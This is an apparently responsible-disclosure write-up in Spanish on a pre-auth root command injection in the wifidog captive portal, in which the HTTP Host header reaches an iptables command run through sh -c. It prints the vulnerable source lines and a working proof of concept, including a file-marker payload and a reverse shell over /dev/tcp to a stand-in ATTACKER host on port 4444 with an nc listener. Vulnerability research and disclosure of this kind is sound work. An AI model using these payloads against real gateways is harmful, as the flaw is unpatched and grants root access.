wifidog RCE root: cabecera Host → iptables (CWE-78)

Request HTTP pre-auth con cabecera Host maliciosa termina en execvp(/bin/sh, -c) que construye iptables. Reverse shell root verificada. Sink fw_iptables.c:596 → util.c:96.

📅 2026-09-02⏱ 17 min🏷 Vulnerability Research
// En 30 segundos
  • Un único request HTTP pre-auth al puerto 2060 con la cabecera Host manipulada termina en execvp("/bin/sh","-c").
  • Resultado: reverse shell como root (uid=0), vía CWE-78 en la frontera HTTP→firewall.
  • Cadena: libhttpd/api.c:462 → http.c:140/154 → fw_iptables.c:596 → util.c:96.

01. Resumen ejecutivo

wifidog es un captive portal de código abierto para gateways WiFi (usado históricamente en OpenWrt y redes comunitarias/ISP). Expone un pequeño servidor HTTP en el puerto 2060 por defecto, que implementa el protocolo de la red de auth (WiFi municipal, Facebook WiFi, etc.). Esa superficie es pre-auth: cualquiera que alcance el puerto 2060 puede enviar requests.

La vulnerabilidad: la cabecera Host del request termina interpolada en un comando iptables que se ejecuta con /bin/sh -c. Como el host no se valida, inyectar ;comando;# en el header termina en ejecución de código como root.

Veredicto

RCE root · pre-auth · CWE-78 · Sin CVE conocido · Sin fix · Validado E2E con reverse shell uid=0 · Requiere config FirewallRuleSet global.

02. 0x00 — El camino del request

  1. libhttpd/api.c:462 — el servidor HTTP embebido extrae la cabecera Host del request y la guarda sin validar.
  2. http.c:140/154 — el request cae en la whitelist del portal (404/handling de auth); el host se propaga como candidato a la regla de permit.
  3. fw_iptables.c:596 — fw_allow_host construye la cadena iptables -d %s -j ACCEPT con el host.
  4. util.c:96 — execvp("/bin/sh","-c",comando) ejecuta la cadena. El ; del payload cierra el contexto y ejecuta el comando inyectado.

03. 0x01 — Los sinks

Este es el eslabón que convierte el host en comando. La cadena se arma con el host sin escapar y se entrega a execvp con /bin/sh:

c
// fw_iptables.c:596 — construye la regla con el host del atacante
sprintf(cmd, "iptables -d %s -j ACCEPT", host);  // host = cabecera Host

// util.c:96 — ejecuta la cadena con sh -c (shell de sistema)
execvp("/bin/sh", argv);  // argv = ["sh","-c", cmd]

// Con Host = ";touch /tmp/wd_pwn;#.M" la regla efectiva es:
//   iptables -d ;touch /tmp/wd_pwn;#.M -j ACCEPT
//   => el ';' cierra, touch se ejecuta, el '#' comenta el resto

04. 0x02 — El PoC

El PoC es un único request HTTP al puerto 2060 con el header Host manipulado. La forma más limpia de demostrar la ejecución es un marcador que se crea como root:

http
# Payload en la cabecera Host (marcador de archivo, fase inicial):
Host: ;touch /tmp/wd_pwn;#.M

# El '.M' tras el '#' es el resto del host original que el '#' comenta.
# Resultado: sh -c "iptables -d ;touch /tmp/wd_pwn;#.M -j ACCEPT"
#            => /tmp/wd_pwn creado como root

Para la validación definitiva, el marcador se sustituye por un reverse shell hacia el host atacante. Como wifidog corre habitualmente como root (para gestionar iptables), la shell llega directamente con uid=0.

05. 0x03 — Validación E2E: reverse shell root

Se sigue el SOP E2E en container: se levanta wifidog con el cliente auth simulado, se envía el request malicioso y se confirma la reverse shell con uid=0(root).

bash
# Container, wifidog compilado + authclient simulado escuchando
wf_auth_listen # responde el protocolo de auth (necesario para completar el request)
wifidog -f -c /etc/wifidog.conf

# Envío del request con el header Host manipulado (reverse shell)
Host: ;bash -i >&/dev/tcp/ATTACKER/4444 0>&1;#.M

# En el listener del atacante:
$ nc -lvnp 4444
Connection received ... # reverse shell como root
# id
uid=0(root) # RCE ROOT verificado

06. 0x04 — Requisito de configuración y mitigación

El camino fw_allow_host → iptables -d solo se recorre cuando existe al menos un FirewallRuleSet global definido en la config con una regla que use el host permitido. En la configuración por defecto pura de wifidog, esa sección puede estar vacía, lo que impide alcanzar el sink. En despliegues reales (OpenWrt, redes municipales, gateways de pago) suele definirse para autorizar hosts, lo que hace el sink alcanzable.

⚠
Divulgación responsable y mitigación

El fix correcto es validar/escapar el valor del host antes de interpolarlo en un comando — nunca pasar datos de red a un shell — o ejecutar las reglas iptables sin sh -c. Aplica a cualquier componente que derive comandos de firewall a partir de cabeceras HTTP. Comunicado al mantenedor como parte del proceso responsable.
